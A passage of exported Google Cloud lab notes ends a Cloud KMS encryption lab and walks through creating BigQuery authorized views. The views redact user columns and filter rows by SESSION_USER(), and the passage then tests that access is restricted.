23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You have successfully used Cloud KMS keys.</span></p><h4 id='congratulations-13'><span>Congratulations!</span></h4><p><span>In this lab, you have done the following:</span></p><ol start='' ><li><p><span>Managed keys and encrypted data using Cloud KMS.</span></p></li><li><p><span>Created KeyRings and CryptoKeys.</span></p></li><li><p><span>Set a default encryption key for a storage bucket.</span></p></li><li><p><span>Encrypted an object with a Cloud KMS key.</span></p></li><li><p><span>Rotated encryption keys.</span></p></li><li><p><span>Manually performed server-side encryption with Cloud KMS keys.</span></p></li></ol><p>&nbsp;</p><h3 id='lab---creating-a-bigquery-authorized-view'><span>LAB - Creating a BigQuery Authorized View</span></h3><h4 id='overview-16'><span>Overview</span></h4><p><span>When using </span><a href='https://cloud.google.com/bigquery'><span>BigQuery</span></a><span>, permissions are configured at the dataset level. Frequently, data engineering teams maintain datasets with many large tables of raw data, but they want to share subsets of these tables with particular analyst audiences.</span></p><p><span>For example, analysts might have access to a version of a table that excludes columns with user-specific information. Or, perhaps a specific user should be able to see only specific rows from a given BigQuery table or view.</span></p><p><span>In this lab, you will learn how to create and use Authorized Views in BigQuery. You will also learn how to do row-level filtering using information about the logged-in user.</span></p><p><span>This lab will provide two Google Cloud users. This is so the BigQuery authorized view permissions can be verified by logging in as a different user.</span></p><h5 id='objectives-13'><span>Objectives</span></h5><p><span>In this lab, you will learn how to perform the following tasks:</span></p><ul><li><p><span>Set permissions on BigQuery datasets.</span></p></li><li><p><span>Use Authorized Views to provide audiences read-only access to subsets of tables.</span></p></li><li><p><span>Use the </span><code>SESSION_USER()</code><span> function to limit access to specific rows within a table/view.</span></p></li></ul><h4 id='setup-and-requirements-13'><span>Setup and requirements</span></h4><p><span>For each lab, you get a new Google Cloud project and set of resources for a fixed time at no cost.</span></p><ol start='' ><li><p><span>Sign in to Qwiklabs using an </span><strong><span>incognito window</span></strong><span>.</span></p></li><li><p><span>Note the lab&#39;s access time (for example, </span><code>1:15:00</code><span>), and make sure you can finish within that time.</span>
<span>There is no pause feature. You can restart if needed, but you have to start at the beginning.</span></p></li><li><p><span>When ready, click </span><strong><span>Start lab</span></strong><span>.</span></p></li><li><p><span>Note your lab credentials (</span><strong><span>Username</span></strong><span> and </span><strong><span>Password</span></strong><span>). You will use them to sign in to the Google Cloud Console.</span></p></li><li><p><span>Click </span><strong><span>Open Google Console</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Use another account</span></strong><span> and copy/paste credentials for </span><strong><span>this</span></strong><span> lab into the prompts.</span>
<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h4 id='task-1-create-the-source-dataset'><span>Task 1. Create the source dataset</span></h4><p><span>In this task, you create the source dataset in BigQuery that will be used in this lab.</span></p><h5 id='create-a-new-bigquery-dataset'><span>Create a new BigQuery dataset</span></h5><ol start='' ><li><p><span>In the Cloud Console, open the BigQuery user interface by selecting </span><strong><span>Navigation menu &gt; BigQuery</span></strong><span>, then click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Create a new dataset within your project by clicking the three dots next to your project ID in the </span><strong><span>Explorer</span></strong><span> section, then click on </span><strong><span>Create dataset</span></strong><span>.</span></p></li><li><p><span>Enter </span><code>source_data</code><span> for </span><strong><span>Dataset ID</span></strong><span>, and click on </span><strong><span>Create Dataset</span></strong><span> (accepting the other default values).</span></p></li></ol><h5 id='create-a-new-bigquery-table-with-source-data'><span>Create a new BigQuery table with source data</span></h5><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> to open Cloud Shell. If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Load the source data into a new table in BigQuery by entering the following in Cloud Shell:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bq load --autodetect $DEVSHELL_PROJ:source_data.events gs://cloud-training/gcpsec/labs/bq-authviews-source.csv</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the BigQuery console, review the loaded data by drilling down to </span><code>[your_project_id].source_data.events</code><span> in the </span><strong><span>Explorer</span></strong><span> section and clicking </span><strong><span>Preview</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> You may need to refresh the browser to see the </span><strong><span>events</span></strong><span> table.</span></p><p><strong><span>Note:</span></strong><span> This table has simulated data related to events generated by users of a videoconferencing application. Note that each row has information about the user who generated the event.</span></p><ol start='' ><li><p><span>To ensure a future step will work as intended, enter the following query in the BigQuery </span><strong><span>Editor</span></strong><span>. Replace </span><code>&lt;2nd qwiklabs user&gt;</code><span> with </span><code>Username 2</code><span> in the qwiklabs console.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">update source_data.events</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">set email='&lt;2nd qwiklabs user&gt;'</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">where email='rhonda.burns@example-dev.com'</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>RUN</span></strong><span> and wait for the 68 rows to be updated with a new email address.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create the source dataset</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-2-create-the-analyst-dataset'><span>Task 2. Create the analyst dataset</span></h4><p><span>In this task, you create the analyst dataset, create a redacted view for the analysts, and create a second view for logged-in users.</span></p><h5 id='create-a-dataset'><span>Create a dataset</span></h5><ol start='' ><li><p><span>Create a new dataset within your project by clicking the three dots next to your project ID in the </span><strong><span>Explorer</span></strong><span> section, then click on </span><strong><span>Create dataset</span></strong><span>.</span></p></li><li><p><span>Enter </span><code>analyst_views</code><span> for </span><strong><span>Dataset ID</span></strong><span>, and click on </span><strong><span>Create Dataset</span></strong><span> (accepting the other default values).</span></p></li></ol><h6 id='create-a-redacted-view-for-analysts'><span>Create a redacted view for analysts</span></h6><ol start='' ><li><p><span>In the BigQuery </span><strong><span>Editor</span></strong><span> area, enter the following SQL to get event data excluding the user-specific information:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  date,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  type,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  company,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  call_duration,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  call_type,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  call_num_users,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  call_os,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  rating,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  comment,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  session_id,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  dialin_duration,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ticket_number,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  ticket_driver</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  `[your_project_id].source_data.events`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 360px;"></div><div class="CodeMirror-gutters" style="display: none; height: 360px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> Make sure to replace the </span><code>[your_project_id]</code><span> with the Qwiklabs-created project id.</span></p><ol start='' ><li><p><strong><span>Run</span></strong><span> the query and review the results. Note that the user information is not included.</span></p></li><li><p><span>Save the entered query as a view by clicking </span><strong><span>Save &gt; Save view</span></strong><span>.</span></p></li><li><p><span>Select your project, and the </span><strong><span>analyst_views</span></strong><span> dataset.</span></p></li><li><p><span>Enter a destination table name of </span><code>no_user_info</code><span> and click </span><strong><span>Save</span></strong><span>. Note, though the UI says destination table, you are only creating a view, not a table.</span></p></li><li><p><span>Check that the view works by navigating in the </span><strong><span>Explorer</span></strong><span> section to </span><strong><span>[your_project_id].analyst_views.no_user_info</span></strong><span>. You should see the schema information for the view, which excludes user information columns.</span></p></li><li><p><span>Click on </span><strong><span>no_user_info</span></strong><span> view. Click </span><strong><span>QUERY &gt; In new tab</span></strong><span> and enter </span><code>*</code><span> into the SELECT statement so that your SQL query looks like this:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  *</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  `[your_project_id].analyst_views.no_user_info`</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">LIMIT</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  1000</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><strong><span>Run</span></strong><span> the query and you should see results similar to those in above step, but without user data.</span></p></li></ol><h5 id='create-a-second-view-showing-only-rows-for-logged-in-user'><span>Create a second view, showing only rows for logged-in user</span></h5><p><span>Next, create a 2nd view using the following information.</span></p><ol start='' ><li><p><span>Enter the Query in the BigQuery </span><strong><span>Editor</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Make sure to replace the </span><code>[your_project_id]</code><span> with the Qwiklabs-created project id.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  *</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  `[your_project_id].source_data.events`</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">WHERE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  email = SESSION_USER()</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run</span></strong><span>.</span></p></li><li><p><span>Save the entered query as a view by clicking </span><strong><span>Save &gt; Save view</span></strong><span>.</span></p></li><li><p><span>Select your project, and the </span><strong><span>analyst_views</span></strong><span> dataset.</span></p></li><li><p><span>Enter a destination table name of </span><code>row_filter_session_user</code><span> and click </span><strong><span>Save</span></strong><span>.</span></p></li></ol><p><strong><span>Note:</span></strong><span> This 2nd view allows users to see their own events, but no one else&#39;s.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create the analyst dataset</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-3-secure-the-analyst-dataset'><span>Task 3. Secure the analyst dataset</span></h4><p><span>In this task you share the analyst dataset with Username 2, and secure it by providing the Viewer role.</span></p><h5 id='share-the-dataset'><span>Share the dataset</span></h5><ol start='' ><li><p><span>In the dataset listing to the left of the screen, click on the </span><strong><span>analyst_views</span></strong><span> dataset.</span></p></li><li><p><span>Then select </span><strong><span>Sharing</span></strong><span> from the right pane and click on </span><strong><span>Permissions</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Add Principal</span></strong><span>. In the </span><strong><span>New principals</span></strong><span> field, enter the email address of the 2nd lab account (Username 2) shown in the </span><strong><span>Connection Details</span></strong><span> section of the Qwiklabs lab page.</span></p></li><li><p><span>Select </span><strong><span>BigQuery Data Viewer</span></strong><span> as the role and click </span><strong><span>Save</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Close</span></strong><span>.</span></p></li></ol><h4 id='task-4-secure-the-source-dataset'><span>Task 4. Secure the source dataset</span></h4><p><span>In this task, you secure the source dataset. You don&#39;t want analysts and others outside the data engineering team to have access to the raw data available in the source dataset, so you are going to restrict access.</span></p><p><span>You do want those using the views you&#39;ve created to be able to see the data the views produce. This will require authorizing not the users, but the views.</span></p><h5 id='share-the-dataset-2'><span>Share the dataset</span></h5><ol start='' ><li><p><span>In the dataset listing to the left of the screen, click on the </span><strong><span>source_data</span></strong><span> dataset.</span></p></li><li><p><span>Then select </span><strong><span>Sharing</span></strong><span> from the right pane and click on </span><strong><span>Permissions</span></strong><span>.</span></p></li><li><p><span>Expand the </span><strong><span>BigQuery Data Viewer</span></strong><span> principal from the permission list and click on the trash icon next to it and click </span><strong><span>Remove</span></strong><span> to confirm. Click </span><strong><span>Close</span></strong><span>.</span></p></li><li><p><span>In </span><strong><span>Sharing</span></strong><span>, click on </span><strong><span>Authorize Views</span></strong><span> .</span></p></li><li><p><span>In the </span><strong><span>Authorized views</span></strong><span>, choose the following settings.</span></p></li></ol><figure class='table-figure'><table><thead><tr><th><strong><span>Authorized view</span></strong></th><th><code>no_user_info</code></th></tr></thead><tbody><tr><td>&nbsp;</td><td>&nbsp;</td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Add Authorization</span></strong><span>.</span></p></li><li><p><span>Add another entry with these settings replacing the existing view.</span></p></li></ol><figure class='table-figure'><table><thead><tr><th><strong><span>Authorized view</span></strong></th><th><code>row_filter_session_user</code></th></tr></thead><tbody><tr><td>&nbsp;</td><td>&nbsp;</td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>Add Authorization</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Close</span></strong><span>.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Secure the datasets</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-5-test-your-security-settings'><span>Task 5. Test your security settings</span></h4><p><span>In this task, you test the security settings that you applied in previous tasks.</span></p><h5 id='sign-in-to-the-cloud-console-as-the-second-user-2'><span>Sign in to the Cloud Console as the second user</span></h5><ol start='' ><li><p><span>Open another tab in your incognito window.</span></p></li><li><p><span>Browse to the </span><a href='http://console.cloud.google.com/'><span>Cloud Console</span></a><span>.</span></p></li><li><p><span>Click on the user icon in the top-right corner of the screen, and then click </span><strong><span>Add account</span></strong><span>.</span></p></li><li><p><span>Sign in to the Cloud Console with the </span><strong><span>Username 2</span></strong><span> provided in Qwiklabs.</span></p></li></ol><h5 id='check-access-to-the-analyst-views'><span>Check access to the analyst views</span></h5><ol start='' ><li><p><span>In the Cloud Console, open the BigQuery user interface by selecting </span><strong><span>Navigation menu &gt; BigQuery</span></strong><span>, then click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Verify that you can run queries against the </span><strong><span>no_user_info</span></strong><span> view by executing the following query:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  *</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  `analyst_views.no_user_info`</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">WHERE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  type='register'</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see a result set with all the user registration events within the table.</span></p><ol start='' ><li><p><span>Verify that you can query the </span><code>row_filter_session_user</code><span> view, only seeing the rows associated with your account, by executing the following query:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  *</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  `analyst_views.row_filter_session_user`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see a result set with 68 rows specific to the second Qwiklabs user.</span></p><p><span>Check access to the source dataset</span></p><ol start='' ><li><p><span>Try accessing the raw data in the events table directly using the following query:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SELECT</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  *</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">FROM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  `source_data.events`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You will see an </span><strong><span>Access denied</span></strong><span> error message indicating that you don&#39;t have permissions.</span></p><ol start='' ><li><p><span>Try navigating to the source_data dataset via the </span><strong><span>Explorer</span></strong><span> section of the UI. This should also be disallowed.</span></p></li></ol><p><strong><span>Note:</span></strong><span> The 2nd Qwiklabs user has permissions to view tables and views in the </span><strong><span>analyst_views</span></strong><span> dataset, but does not have permissions to view anything in the </span><strong><span>source_data</span></strong><span> 